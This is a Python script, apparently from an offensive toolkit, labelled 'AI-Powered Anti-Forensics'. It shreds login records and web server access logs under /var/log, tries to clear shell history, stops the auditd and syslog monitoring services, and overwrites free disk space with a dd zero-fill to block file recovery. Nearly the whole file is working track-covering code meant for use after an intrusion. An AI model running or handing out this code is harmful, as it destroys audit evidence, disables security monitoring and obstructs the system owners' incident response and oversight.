import os
import json
import subprocess
import time
from colorama import Fore, Style, init

# Initialize colorama for colored output
init(autoreset=True)

# Load Config
CONFIG_FILE = "config/settings.json"
if not os.path.exists(CONFIG_FILE):
    print(Fore.RED + f"⚠️ Config file {CONFIG_FILE} is missing! Run `setup_config.py`")
    exit(1)

with open(CONFIG_FILE) as config_file:
    config = json.load(config_file)

TARGET = config.get("TARGET", "example.com")
TIMEOUT = config.get("TIMEOUT", 10)

# Save Anti-Forensics Logs
def log_anti_forensics(data):
    os.makedirs("reports", exist_ok=True)
    log_path = f"reports/{TARGET}_anti_forensics.json"

    with open(log_path, "w") as log_file:
        json.dump(data, log_file, indent=4)

    print(Fore.GREEN + f"📄 Anti-Forensics Report saved: {log_path}")

# Securely Delete Log Files
def secure_delete_logs():
    print(Fore.CYAN + "🔍 Securely Deleting System Logs...")
    log_paths = ["/var/log/wtmp", "/var/log/lastlog", "/var/log/nginx/access.log", 
                 "/var/log/apache2/access.log", "/var/log/btmp"]

    cleared_logs = []

    for log in log_paths:
        if os.path.exists(log):
            subprocess.run(f"shred -u {log}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print(Fore.GREEN + f"✅ Cleared: {log}")
            cleared_logs.append(log)
        else:
            print(Fore.YELLOW + f"⚠️ Log file not found: {log}")

    return cleared_logs

# Wipe Shell History
def clear_history():
    print(Fore.CYAN + "🔍 Wiping Shell History...")
    subprocess.run("history -c && history -w", shell=True)
    print(Fore.GREEN + "✅ Cleared shell history")
    return "Shell history cleared"

# Stop Security Monitoring Services
def stop_security_services():
    print(Fore.CYAN + "🔍 Stopping Security Monitoring Services...")
    services = ["auditd", "syslog"]

    stopped_services = []
    for service in services:
        result = subprocess.run(f"systemctl stop {service}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        if result.returncode == 0:
            print(Fore.GREEN + f"✅ Stopped: {service}")
            stopped_services.append(service)
        else:
            print(Fore.YELLOW + f"⚠️ Could not stop: {service}")

    return stopped_services

# Overwrite Free Space to Prevent Recovery
def overwrite_free_space():
    print(Fore.CYAN + "🔍 Overwriting Free Space to Prevent Recovery...")
    subprocess.run("dd if=/dev/zero of=/zerofill bs=1M; rm -f /zerofill", shell=True)
    print(Fore.GREEN + "✅ Overwritten free space to prevent file recovery")
    return "Free space overwritten"

# Main Execution
def main():
    print(Fore.MAGENTA + "🚀 Running AI-Powered Anti-Forensics Techniques...")
    start_time = time.time()

    results = {
        "cleared_logs": secure_delete_logs(),
        "cleared_history": clear_history(),
        "stopped_services": stop_security_services(),
        "wiped_free_space": overwrite_free_space()
    }

    log_anti_forensics(results)

    end_time = time.time()
    print(Fore.GREEN + f"✅ Anti-Forensics completed in {round(end_time - start_time, 2)} seconds.")

if __name__ == "__main__":
    main()
